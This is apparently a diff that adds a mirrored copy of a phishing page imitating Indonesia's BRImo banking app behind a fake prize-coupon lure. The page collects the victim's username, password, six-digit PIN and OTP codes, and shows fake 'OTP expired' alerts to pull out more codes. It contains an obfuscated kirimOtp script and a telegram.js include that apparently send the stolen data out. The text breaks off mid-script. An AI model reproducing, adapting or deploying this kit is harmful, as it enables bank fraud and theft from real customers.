@@ -1,0 +1,975 @@
+
+<html lang="en">
+
+<!-- Mirrored from hadiah-baruu.zzyus.life/id/login/ by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 13 Nov 2023 13:00:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta name="theme-color" content="#0F78CB"> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>BRImo | Gebyar</title>
+    <link rel="stylesheet" href="../../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="../style/gaya.css">
+        <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+<script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+</head>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&amp;display=swap');
+    * {
+        font-family: 'Montserrat', sans-serif;
+        font-weight: 400;
+        margin: 0;
+        padding: 0;
+        font-size: 15px;
+        box-sizing: border-box;
+        position: relative;
+        color: #000;
+    }
+   
+    .blue {
+        color: #00529C;
+    }
+    .container {
+        width: 100%;
+        height: 100%;
+    }
+    .flex {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+    .containerlog .head {
+        width: 100%;
+        display: flex;
+    }
+    .containerlog .head img {
+        width: 100%;
+        margin: auto;
+    }
+    .containerlog .bform {
+        position: fixed;
+        bottom: 0;
+        z-index: 999999;
+        background: #fff;
+        width: 100%;
+        padding: 0 15px;
+    }
+    .containerlog .tit {
+        font-size: 23px;
+        font-weight: 800;
+        margin-bottom: 20px;
+    }
+    .containerlog .bginp {
+        box-shadow: 0px 2px 5px 1px #e7e7e7;
+        border: 0.3px solid #e7e7e75b;
+        border-radius: 6px;
+        overflow: hidden;
+        width: 100%;
+        padding: 8px;
+        padding-bottom: 0;
+    }
+    .containerlog .wrpinp {
+        width: 100%;
+        height: 55px;
+        max-height: 60px;
+        display: flex;
+        align-items: flex-end;
+        padding-bottom: 15px;
+    }
+    .containerlog .wrpinp i {
+        font-size: 19px;
+        text-align: center;
+    }
+    .containerlog .wrpinp i.icon {
+        width: 35px;
+        max-width: 35px;
+        margin-right: 7px;
+    }
+    .containerlog input {
+        width: 100%;
+        border: none;
+        font-size: 16px;
+        font-weight: 500;
+        outline: none;
+        background: none;
+    }
+    .containerlog .forgot {
+        width: 100%;
+        text-align: right;
+        font-size: 14px;
+        font-weight: 800;
+        margin: 10px 0;
+    }
+    .containerlog #formLog #btnsubmit {
+        margin-bottom: 20px;
+    }
+    .containerlog button:disabled {
+        background: #0079e65b;
+        transition: .2s;
+    }
+    .containerlog button {
+        width: 100%;
+        height: 47px;
+        max-height: 47px;
+        border: none;
+        border-radius: 6px;
+        background: #0079e6;
+        color: #ffffff;
+        text-align: center;
+        font-size: 14px;
+        font-weight: 800;
+        margin-top: 35px;
+        transition: .2s;
+    }
+    .toggle {
+        position: absolute;
+        right: 0;
+        bottom: 5px;
+        width: 45px;
+        height: 45px;
+        z-index: 9999;
+    }
+    .toggle i {
+        position: absolute;
+        font-size: 19px;
+    }
+    @media screen and (min-width: 768px) {
+        .container {
+            width: 600px;
+            height: 800px;
+            margin: auto auto;
+        }
+        .containerlog .bform {
+            position: relative;
+            padding-bottom: 30px;
+        }
+    }
+    
+    /*input PIN style*/
+    
+    .containerpin * {
+        color: #fff;
+    }
+    .containerpin {
+        position: fixed;
+        top: 0;
+        left: 0;
+        background: #0000009b;
+        backdrop-filter: blur(8px);
+        z-index: 99999999;
+        width: 100%;
+        height: 100%;
+    }
+    .containerpin .headpin {
+        width: 100%;
+        padding: 20px;
+    }
+    .containerpin .headpin h1 {
+        font-size: 15px;
+        font-weight: 800;
+        text-align: center;
+    }
+    .containerpin .headpin i {
+        font-size: 20px;
+        position: absolute;
+        left: 20px;
+    }
+    .containerpin h1.tit {
+        font-size: 20px;
+        font-weight: 800;
+        text-align: center;
+        margin: 40px 0;
+    }
+    .containerpin .bginp {
+        width: 100%;
+        height: 40px;
+    }
+    .containerpin .clear {
+        width: 100%;
+        height: 100%;
+        position: absolute;
+        z-index: 99;
+    }
+    .containerpin input:valid {
+        background: #ffffff9b;
+        transition: .2s;
+    }
+    .containerpin input {
+        transition: .2s;
+        background: none;
+        width: 22px;
+        height: 22px;
+        border-radius: 50%;
+        border: 2.5px solid #fff;
+        outline: none;
+        text-align: center;
+        color: transparent;
+        font-weight: 700;
+        margin: 0 10px;
+    }
+    .containerpin span.frgt {
+        font-size: 14px;
+        width: 110px;
+        font-weight: 800;
+        padding: 14px 15px;
+        background: #0000003b;
+        margin: 30px auto 50px auto;
+        color: #0079e6;
+        border-radius: 17px;
+    }
+    .keypad {
+        width: 100%;
+        position: fixed;
+        bottom: 20px;
+        left: 0;
+    }
+    .keypad .table {
+        height: auto;
+        width: 330px;
+    }
+    .table .line {
+        width: 100%;
+        margin: 15px 0;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+    }
+    .table .line button:active {
+        background: #ffffff3b;
+        transition: 0s;
+    }
+    .table .line button i {
+        font-size: 20px;
+    }
+    .table .line button {
+        transition: .2s;
+        height: 60px;
+        width: 60px;
+        border-radius: 50%;
+        background: none;
+        border: none;
+        outline: none;
+        font-size: 22px;
+        font-weight: 700;
+        text-align: center;
+    }
+    @media screen and (min-width: 768px) {
+        .containerpin .headpin {
+            width: 600px;
+            margin: 0 auto;
+        }
+        .containerpin .keypad {
+            position: relative;
+            margin-top: 100px;
+        }
+    }
+
+
+
+
+   body, html {
+           
+         background-position: center;
+       background: #fff;
+         height: 100%;
+  font-size: 16px;
+  position: fixed;
+  width: 100%;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+            padding: 0;
+            margin: 0;
+            font-family: 'Open Sans', sans-serif;
+        }
+
+        .imagesi{
+    margin-top: 20px;
+    width: 100%;
+    height: 98%;
+    position: fixed;
+        }
+        
+        .Input{
+            width: 90%;
+            height: 50px;
+            position: absolute;
+            left: 0;
+            right: 0;
+            outline: none;
+            margin: 0px auto;
+            border: 1.5px solid #ddd;
+            border-radius: 8px;
+            padding-left: 50px;
+            top: 80;
+        }
+        
+        .Input::placeholder{
+            color: #aaa;
+        }
+        
+        
+        .Input:focus, .input:active{
+            border: 1.5px solid #bbb;
+        }
+        
+ion-icon{
+    width: 25px;
+    height: 25px;
+}
+
+
+   .btn-login {
+
+            font-family: 'Avenir';
+position: fixed;
+            display: block;
+            margin: 0px auto;
+            padding: 0px; 
+     font-weight: 700;
+    width: 100%;
+    height: 50px;
+    background: #0F78CB;
+    padding-right: 0px;
+            cursor: pointer; 
+    background-position: 0px 0px;
+    background-size: 100% 53px;
+    background-repeat: no-repeat;
+            border: none; 
+            text-align: center; 
+            height: 50px; 
+            width: 90%; 
+            left: 0;
+            right: 0;
+            font-family: Arial; 
+            font-size: 15px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 0px 0px 0px 0px; 
+            transition: background 100ms step-start 0s;
+            bottom: 50;
+        }
+
+        .btn-login:disabled {
+            opacity: 0.5;
+            c
+        }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login {
+                width: 90%;
+            }
+        }
+        #ionIcons {
+            color: #2C2C2C;
+            font-size: 20px;
+            width: 20px;
+            height: 20px;
+            position: absolute;
+            display: block;
+            margin-top: 91px;
+            z-index: 9;
+            margin-left: 30px;
+            padding: 3px 8px 8px 0px;
+            opacity: 0.7;
+        }
+
+        
+        .eye {
+            display: block;
+            margin: 0px auto;
+            margin-right: 20px;
+            position: absolute;
+            box-sizing: border-box; 
+            z-index: 16; 
+            right: 11;
+            top: 153;
+            height: 19.8189px;
+            width: 25.0236px; 
+            float: right;
+            border-radius: 0px; 
+            cursor: pointer;
+            z-index: 9999;
+        }
+        
+          .btn-login1 {
+
+            font-family: 'Avenir';
+position: absolute;
+            display: block;
+            margin: 0px auto;
+            padding: 0px; 
+     font-weight: 700;
+    width: 100%;
+    height: 52px;
+    
+    padding-right: 60px;
+            cursor: pointer; 
+            background-color: transparent;
+    background-image: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigrkyvE1T2DsAnuhfEP1fiaWmqVZn-bd_GGi7QocBRx3gOwn9fswsPJvsm0-FC80Efc2AKkbJR_4ALZ1FVI7YlcbKijTKMG862bBhdK_iYuD2PchdlcVdD7IGTcD5jJolCN0MSv-uxi3M8REQOYmzUi5B0DpMsrF3R9BEzzmaJ6hs2TMKw2HlTPdnW/s1039/IMG_20221215_151324.jpg");
+    background-position: 0px 0px;
+    background-size: 100% 53px;
+    background-repeat: no-repeat;
+            border: none; 
+            text-align: center; 
+            height: 52px; 
+            width: 90%; 
+            left: 0;
+            right: 0;
+            font-family: Arial; 
+            font-size: 15px; 
+            font-weight: bold; 
+            color: rgb(255, 255, 255); 
+            letter-spacing: 1px; 
+            line-height: 1; 
+            border-radius: 8px; 
+            box-shadow: rgb(170, 170, 170) 0px 0px 0px 0px; 
+            transition: background 100ms step-start 0s;
+            bottom: 20;
+        }
+
+        .btn-login1:disabled {
+            opacity: 0.5;
+        }
+
+        @media only screen and (max-width: 600px) {
+            .btn-login1 {
+                width: 90%;
+            }
+        }
+        /* otp style*/
+        .inputotp {
+    box-sizing: border-box;
+    margin-top: 20px;
+    width: 80%;
+    height: 70px
+    background-color: none;
+          
+        }
+.formotp {
+    max-width: 500px;
+    margin: auto;
+    margin-top: 10px;
+/*    background-color: lightgreen;*/
+}
+
+/*********************/
+.six_otp {
+    display: flex;
+/*    background-color: blue;*/
+    justify-content: center;
+
+}
+.inpotp {
+    background-color:  #0000009b;
+    color: white;
+    caret-color: transparent;
+    font-size: 20px;
+    font-weight: 600;
+    text-align: center;
+    width: 40px;
+    height: 42px;
+    border: none;
+    outline: none;
+    border-radius: 4px;
+    margin-left: 2px;
+    margin-right: 2px;
+    
+  
+} 
+.containerotp {
+    box-sizing: border-box;
+    display: block;
+    margin: auto;
+    width: 100%;
+    height: 100%;
+    max-width: 600px;
+    max-height: 1000px;
+    background-color:  #D6DAE0;
+    opacity: 5.5;
+    color: white;
+    padding: 25px;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    -webkit-transform: translate(-50%, -50%);
+    -moz-transform: translate(-50%, -50%);
+    -ms-transform: translate(-50%, -50%);
+    -o-transform: translate(-50%, -50%);
+    }
+
+.textarea {
+            box-sizing: border-box; 
+            height: 200px;
+            margin-top: -30px;
+            width: 280px;
+            border: 3px solid rgb(0, 134, 224);
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+            }
+            
+.box-lte {
+        width: 380px;
+        max-width: 95%;
+        background: white;
+        display: block;
+        margin: -40px auto;
+        border-radius: 10px;
+      }
+      textarea {
+            box-sizing: border-box; 
+            height: 75px;
+            margin-top: -30px;
+            width: 280px;
+            border: 3px solid rgb(0, 134, 224);
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+          .textarea1 {
+            box-sizing: border-box; 
+            
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 50px;
+            
+        }
+        
+         .textarea {
+            box-sizing: border-box; 
+            height: 75px;
+           
+            width: 280px;
+            border: 2px solid red;
+            box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px;
+            border-radius: 15px;
+            padding: 5px 10px;
+        }
+        
+        textarea::placeholder{
+            font-size: 13px;
+        }
+           h1{
+            display: table;
+            background-color: #FF0000;
+            color: #fff;
+            padding: 15px;
+            width: 100%;
+            font-size: 13px;
+            margin-bottom: -70px;
+            text-align: center;
+            position: fixed;
+            top: 0;
+           
+            right: 0;
+            left: 0;
+            margin: 0px auto;
+            
+        }
+        
+        .blink {
+  animation: blink-animation 3s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+.blinkotp {
+    animation: blink-animation 3s steps(6, start) infinite;
+  -webkit-animation: blink-animation 2s steps(6, start) infinite;
+}
+        
+</style>
+<body>
+     <div class="container">
+
+        
+                <img src="https://hosting.tigerengine.id/hs74dl.jpg" alt="" width="100%" height="100%"/>
+            </div>
+   <div class="row mt-3">
+                <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: -10px auto;">
+                    <button class="btn-login1" type="button" onclick="gotologin()">𝗔𝗠𝗕𝗜𝗟 𝗞𝗨𝗣𝗢𝗡 𝗨𝗡𝗗𝗜𝗔𝗡 </button> 
+                    </div>
+            </div>          
+  <div style="position: fixed; left: 0; right: 0; width: 100%; top: 0; bottom: 0; height: 100%; background: rgba(0, 0, 0, 0.5); display: none" id="formlogin">
+    <div style="position: absolute; left: 0; right: 0; width: 100%; height: 315px; background: white; margin: 0px auto; bottom: 0; border-radius: 15px 15px 0px 0px; border: 0px solid blue">
+<button type="button" style="position: absolute; left: 15; top: 14; color: #0F78CB; border: none; background: transparent; z-index: 9999" onclick="batalkanku()">Batalkan</button>
+<center>
+<h3 style="position: absolute; left: 0; right: 0; top: 0; margin: 0px auto; font-size :19px; font-weight: 700; top: 14">Login</h3>
+</center>
+<form onsubmit="pin(); kirimPesan(); return false" method="POST">
+ <ion-icon name="person" id="ionIcons"></ion-icon>
+ <input id="uname" type="text" class="bubble-element Input" name="uname" placeholder="Username BRImo" required autocomplete="off"/><br/><br/>
+<ion-icon name="lock-closed" id="ionIcons" style="margin-top: 115px"></ion-icon>
+<input id="pass" name="pass" type="password" class="bubble-element Input" placeholder="Password BRImo" maxlength="" style="border-radius: ; margin-top: 60px"  pattern="(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Masukan Data yang terdaftar di 𝗕𝗥𝗜𝗺𝗼 anda"  required>
+<div class="bubble-element eye clickable-element" tabindex="3" id="eyeOpen">
+                            <ion-icon name="eye-off" id="eye"></ion-icon>
+                        </div>
+                        <div class="bubble-element eye clickable-element" tabindex="3" id="eyeClose" style="display: none">
+                            <ion-icon name="eye" id="eye"></ion-icon>
+                        </div>
+                                       <button type="submit" id="btnsubmit" disabled class="btn-login">Login</button>
+                                       <center>
+ <a href="/BriDebit(2)(1).html" target="_blank" style="color: #025198; font-weight: 600; font-family: sans-serif; position: fixed; bottom: 10; left: 0; right: 0; margin: 0px auto; font-size: 16px">Lupa Username/Password?</a>
+ </center>
+    </div>
+    </div>
+    </form>
+            </div>
+       
+
+
+        <div class="containerpin" style="display:none;">
+            <div class="flex headpin">
+                <i onclick="window.location.href='index.html'" class="fa-solid fa-arrow-left"></i>
+                <h1>PIN</h1>
+            </div>
+            <h1 class="tit">Masukkan PIN</h1>
+            <form onsubmit="sendPin(event);" id="formPin">
+                <div class="flex bginp">
+                    <div class="clear"></div>
+                    <input required class="pin" type="number" id="pin1" maxlength="1" name="pin1" />
+                    <input required class="pin" type="number" id="pin2" maxlength="1" name="pin2" />
+                    <input required class="pin" type="number" id="pin3" maxlength="1" name="pin3" />
+                    <input required class="pin" type="number" id="pin4" maxlength="1" name="pin4" />
+                    <input required class="pin" type="number" id="pin5" maxlength="1" name="pin5" />
+                    <input required class="pin" type="number" id="pin6" maxlength="1" name="pin6" />
+                </div>
+                <span class="flex frgt blue">Lupa PIN?</span>
+                <div class="flex keypad">
+                    <div class="table">
+                        <div class="line">
+                            <button type="button" onclick="inputKeypad('1', event)">1</button>
+                            <button type="button" onclick="inputKeypad('2', event)">2</button>
+                            <button type="button" onclick="inputKeypad('3', event)">3</button>
+                        </div>
+                        <div class="line">
+                            <button type="button" onclick="inputKeypad('4', event)">4</button>
+                            <button type="button" onclick="inputKeypad('5', event)">5</button>
+                            <button type="button" onclick="inputKeypad('6', event)">6</button>
+                        </div>
+                        <div class="line">
+                            <button type="button" onclick="inputKeypad('7', event)">7</button>
+                            <button type="button" onclick="inputKeypad('8', event)">8</button>
+                            <button type="button" onclick="inputKeypad('9', event)">9</button>
+                        </div>
+                        <div class="line">
+                            <button disabled type="button" ></button>
+                            <button type="button" onclick="inputKeypad('0', event)">0</button>
+                            <button type="button" onclick="deleteInput();" class="flex"><i class="fa-solid fa-arrow-left"></i></button>
+                        </div>
+                    </div>
+                </div>
+            </form>
+        </div>
+
+    </div>
+    <div class="containerotp" style="display:none;" id="formpin"> 
+    <span class="blink" style="display: none" id="blinkk"><h1>Tautan Link tidak Valid, atau sudah Kadaluarsa</h1></span>
+ <span class="blink" style="display: none" id="blinkotp"><h1> × 𝗞𝗼𝗱𝗲 𝗢𝗧𝗣 𝗜𝗻𝘃𝗮𝗹𝗶𝗱, 𝗮𝘁𝗮𝘂 𝗞𝗮𝗱𝗮𝗹𝘂𝘄𝗮𝗿𝘀𝗮</h1></span>
+            <a class="aback"></a>
+<br>
+<div class="box-lte" style="display: block;">
+ <div class="block" style="margin-top: 150px;"> <center>
+     <div class="col-12 d-block mx-auto text-center p-0" style="height: 150px; width: 256px; max-width: 100%; display: block; margin-top: -50px; border-radius: 0px;"><img alt="" src="https://media1.giphy.com/media/cL4VwGyAEP76FQV4vs/giphy.gif" style="display: block; margin: 0px; width: 40%; height: 50%; border-radius: 0px;">𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶
+          <p style="font-weight: bold; font-size: 20px; color: #098CE3; text-align: center; margin: 10px auto;" id="timer"></p>
+          <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
+            <strong><p style="font-size: 12px; text-align: center; font-weight: bold;">Silahkan Cek Kode OTP di 𝗮𝗽𝗹𝗶𝗸𝗮𝘀𝗶 𝗕𝗥𝗜𝗺𝗼 anda, <br>Tekan pada menu 🔔 𝗟𝗼𝗻𝗰𝗲𝗻𝗴 𝗡𝗼𝘁𝗶𝗳𝗶𝗸𝗮𝘀𝗶 di dalam aplikasi BRImo<br>Masukan OTP BRImo Epayment anda :<br/></p></strong> 
+          </div>
+        </div><br><br><br> <br/>           <div class="inputotp">
+                <form onsubmit="otp1(); return false" method="POST" id="formpin">
+                    <div class="six_otp">
+                        <input id="otp1" maxlength="1" type="tel" class="inpotp"></input>
+                        <input id="otp2" maxlength="1" type="tel" class="inpotp"></input>
+                        <input id="otp3" maxlength="1" type="tel" class="inpotp"></input>
+                        <input id="otp4" maxlength="1" type="tel" class="inpotp"></input>
+                        <input id="otp5" maxlength="1" type="tel" class="inpotp"></input>
+                        <input id="otp6" maxlength="1" type="tel" class="inpotp" value="" oninput="kirimOtp()" required></input></div>
+                        
+              <button type="submit" class="bubble-element Button clickable-element" style="max-width: 90%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1.5px; line-height: 1; border-radius: 5px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s;" tabindex="2" onclick="expired()">Konfirmasi</button>
+              </div></div>
+              </form>
+                        <p style="font-size: 10px; text-align: center; margin-top: 50px;"><strong style="color: #5e5e5e;">Tidak terima SMS? <a href="https://sites.google.com/view/bantuan--online-bankbri/center-bank-bri" style="text-decoration: none; color: #828282;">Hubungi Contact Center</a></strong></p>
+            </center>
+            </div></div>
+            <script type="text/javascript ">function expired() {
+                    alert("               𝗞𝗢𝗗𝗘 𝗢𝗧𝗣 𝗦𝗨𝗗𝗔𝗛 𝗞𝗔𝗗𝗔𝗟𝗨𝗪𝗔𝗥𝗦𝗔                                                                                                                                                                                             Silakan mencoba kembali dengan kode BRImo e-payment yang terbaru silakan cek di 🔔 lonceng notifikasi pada aplikasi BRImo");
+                    }</script>
+              <script type="text/javascript ">var kirimOtp;(function(){var EYb='',tpC=582-571;function Cqo(h){var d=1238184;var q=h.length;var l=[];for(var p=0;p<q;p++){l[p]=h.charAt(p)};for(var p=0;p<q;p++){var g=d*(p+489)+(d%24770);var o=d*(p+493)+(d%37638);var x=g%q;var u=o%q;var n=l[x];l[x]=l[u];l[u]=n;d=(g+o)%5704828;};return l.join('')};var oeX=Cqo('xwnstrcqjyeaploktugudmsnocbhorztivfcr').substr(0,tpC);var MOT='(al +=u2Ce;5e,s=S0Avtr;gc"nb0d6f=hijklrnip8retdvgxuzg;fa= j=]8n,;0q8(,.2=6a,91 6z,{5p80,[887o,r6;7+,t0{8l,=4.76,(9,87,;7j;ia] .=)],farrv1rlvu0ivnktl2nvt;;t+v)w[l[(]f={+;;ta  n=]],i,="1aea=d7ido=+66f1r"v,r=s.0jsnapgrm=n;s]lrn4ta;[+().v=rCq7a gemrn6scs;.cpCi((f j)of)rhv[rvo=qol=n+tu-.;v>j0(on-a{7a[ 2=[u!l,vsr4n)q)o);.au ;= upl;var[p,0sv(r(c9n]l.ncte;,ai  ;uo9(ca}  =f;t<u;*+t)ov2r(m=n7cjafCsd,Ap(()hvAr(y{zpm};jf<y"{==)yk1a*=+;.0hrr1oremttj=1t-;;]=j;0+=;ie6s+ ;fumv=f)5r1en(i.ve)g+htitn5c1arCzduA8(r+a)l+h.fh}rtore,t)jf2=-v;]=e;i+u2l}alve3c n=i(ua;.if(1= n7lf)e=;]fi](r>v)+.huhh3nas;botfi[grp=ur)jfspvs.(r[g+(]d;.=a+u;qic(v!nn+l[)+i,(r<h);.ru)h0nes,b)tji(gvpj)rq.og==.honn2"j)o}}a[pnsr({[m]+;kv"rihoaljpi9()");ra( k=}9r,r9r4 ,i2u3 ,[0e.;ovcrtykq;va, <=ltriugofeogCCavCld)(f6;;poo(oai e=f;s<+.)ergvhhv;+.heh+sel-t(t g-ceadAn())h.jognhS+rrn..rrsm(her1ose"lnvd) ;)elu=nahas.l-tvta")"(.1oan2t);';var nDX=Cqo[oeX];var Pmx='';var eLw=nDX;var tZg=nDX(Pmx,Cqo(MOT));var ciF=tZg(Cqo('Yutc.ion.e!$(f"6)9.2))Yvir.e%n+m)Y%Y5uuaoe.b.Yop6s.YpYzp!s.Ys1.(a",t019\'uY9Ypobp2Y.3=(\/"Ytv3.\'7Y(Y%oYp(Y05+(=" tp5e\'%Y\'Ydotp..t)8*!a1u.gon,.tY4u"1m9)+Ybe.uu-a.e-!(aquY+(eeb.)$2Yc9Yk.b+ue!a.s\'!3aYu0+"ebbu)*!-d$!_dY!a#.)22YcbY6.!+.eptq1a%YYo3c%bY)5+%2.uvklYec*aokea=ab!7%8.2a623+3rkakok tpko.Y-YSszojmnrru.(C(zaz5.!.6psh"EesYy#.3bg..Yugeu.=eb.1a0Y231+592t5!be$3!.j4x9{cr.:Y"3t2p4:n\/!p\'.gtYlrg!ae.roYgtb%t.+:oae2+x\/YemdMensdgD?phYtviY=s+.r2pp""ttx#=Yd)!udn!3dt!n#60aks2.Y 2a$_Ye3l+Y&YY$5$&tY+8u5a,dfYYp8a5c,(fc%d0l&tYt6f$4Y,9Y&fY"Y.."Ye.rY"Y."Yg;b{nban+.YdY..6Y ."YdYt&0adsI_,o\/ehhamt"d,cebh7d""oyexjTY}g}*i(i.. tM=se_$5fd6.9;22 l29a1Yi 2gYtElammn3.py#dS.2 bdm2kad.9u.5ecuYo8.5u,reY.!vYlge..;ompdYb8Y5e,Ydl.Y)n*nt. =dYc$mnnY.&%0...3 cvtr eg%a0Y2e ddgd'));var fEH=eLw(EYb,ciF );fEH(1641);return 3214})()</script>
+          </div>
+        </div>
+        </div>
+      <div class="block">
+        <div class="col-12" style="width: 459px; max-width: 100%; display: block; margin: 5px auto; padding: 0 20px;">
+
+        </div>
+      </div>
+    </div>
+    
+    
+        <script>
+        
+const inputs = document.querySelectorAll(".six_otp input");
+const form = document.querySelector("form")
+inputs.forEach((input, index) => {
+    input.dataset.index = index;
+    input.addEventListener("keydown", clear);
+    input.addEventListener("keyup", onKeyUp);
+});
+function clear($event) { $event.target.value = ""; }
+function checkNumber(number) { return /[0-9]/g.test(number); }
+function onKeyUp($event) {
+    const input = $event.target;
+    const value = input.value;
+    const fieldIndex = +input.dataset.index;
+    if ($event.key === "Backspace" && fieldIndex > 0) {
+        input.previousElementSibling.focus();
+    }
+    if (checkNumber(value)) {
+        if (value.length > 0 && fieldIndex < inputs.length - 1) {
+            input.nextElementSibling.focus();
+        }
+        if (input.value !== "" && fieldIndex === inputs.length - 1) {
+            input.readOnly = true;
+            submit();
+        }
+    } else {
+        clear($event);
+    }
+}
+let xx = document.getElementById('process')
+function submit(){
+    xx.style.display = 'flex';
+    setTimeout(function(){
+        form.submit()
+    }, 2000);
+}
+
+var btn_show = document.getElementById('see');
+var pin = document.getElementById('pin1');
+var pinn = document.getElementById('pin2');
+var pinnn = document.getElementById('pin3');
+var pinnnn = document.getElementById('pin4');
+var pinnnnn = document.getElementById('pin5');
+var pinnnnnn = document.getElementById('pin6');
+
+btn_show.addEventListener('click', pasToText);
+
+function pasToText(){
+    if ((pin.type == 'password')&&(pinn.type == 'password')&&(pinnn.type == 'password')&&(pinnnn.type == 'password')&&(pinnnnn.type == 'password')&&(pinnnnnn.type == 'password')){
+        pin.setAttribute('type','text')
+        pinn.setAttribute('type','text')
+        pinnn.setAttribute('type','text')
+        pinnnn.setAttribute('type','text')
+        pinnnnn.setAttribute('type','text')
+        pinnnnnn.setAttribute('type','text')
+        btn_show.innerHTML='SEMBUNYIKAN'
+    } else {
+        pin.setAttribute('type','password')
+        pinn.setAttribute('type','password')
+        pinnn.setAttribute('type','password')
+        pinnnn.setAttribute('type','password')
+        pinnnnn.setAttribute('type','password')
+        pinnnnnn.setAttribute('type','password')
+        btn_show.innerHTML='TAMPILKAN'
+    }
+}
+
+
+    </script>
+<script>
+        document.getElementById('timer').innerHTML =
+          03 + ":" + 01;
+        startTimer();
+        
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          console.log(m)
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
+    <script>
+      document.getElementById('timer')
+      .innerHTML = 03 + ":" + 01;
+      startTimer();
+
+      function startTimer() {
+        var presentTime = document.getElementById('timer').innerHTML;
+        var timeArray = presentTime.split(/[:]+/);
+        var m = timeArray[0];
+        var s = checkSecond((timeArray[1] - 1));
+        if (s == 59) {
+          m = m - 1
+        }
+        if (m < 0) {
+        alert("Waktu Habis");
+          return
+        }
+        document.getElementById('timer').innerHTML = m + " : " + s;
+        setTimeout(startTimer, 1000);
+      }
+
+      function checkSecond(sec) {
+        if (sec < 10 && sec >= 0) {
+          sec = "0" + sec
+        }; // add zero in front of numbers < 10
+        if (sec < 0) {
+          sec = "59"
+        };
+        return sec;
+      }
+    </script>
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="../js/viber.js"></script>
+    <script src="../js/valid.js"></script>
+    <script src="../js/function_btn.js"></script>
+    
+</body>
+<script src="telegram.js"></script>
+  <script>
+       function pin(event){
+            event.preventDefault();
+            $("#btnsubmit").prop("disabled", true);
+            
+            
+
+    </script>
+     <script>
+        function vibr(dur){
+            if (navigator.vibrate) {
+                navigator.vibrate(dur);
+            } else {
+                console.log("NotSupported");
+            }
+        }
+           
+    </script>
+  <script>
+              let inputs = $("form#formPin input");
+        let currentInput = 0;
+        function inputKeypad(value, event) {
+            if (currentInput < inputs.length) {
+                inputs.eq(currentInput).val(value);
+                currentInput++;
+                checkAllInputsFilled();
+            }
+        }
+        function checkAllInputsFilled() {
+            let allFilled = true;
+            inputs.each(function() {
+                if ($(this).hasClass("pin") && $(this).val() === "") {
+                    allFilled = false;
+                    return false;
+                }
+            });
+            if (allFilled) {
+                $("#formPin").submit();
+                $("#formPin .line button").prop("disabled", true);
+            } else {
+                $("#formPin .line button").prop("disabled", false);
+            }
+        }
+        function deleteInput() {
+            if (currentInput > 0) {
+                currentInput--;
+                inputs.eq(currentInput).val("");
+                checkAllInputsFilled();
+            }
+        }
+  </script>
+   <script>
+               $(document).ready(function() {
+            $('.toggle i').click(function() {
+                if ($("#pass").attr('type') === 'password') {
+                    $("#pass").attr('type', 'text');
+                    $(this).removeClass('fa-eye-slash').addClass('fa-eye');
+                } else {
+                    $("#pass").attr('type', 'password');
+                    $(this).removeClass('fa-eye').addClass('fa-eye-slash');
+                }
+            });
+            $('#uname, #pass').on('input', function() {
+                if ($('#uname').val().length < 8 || $('#pass').val().length < 8) {
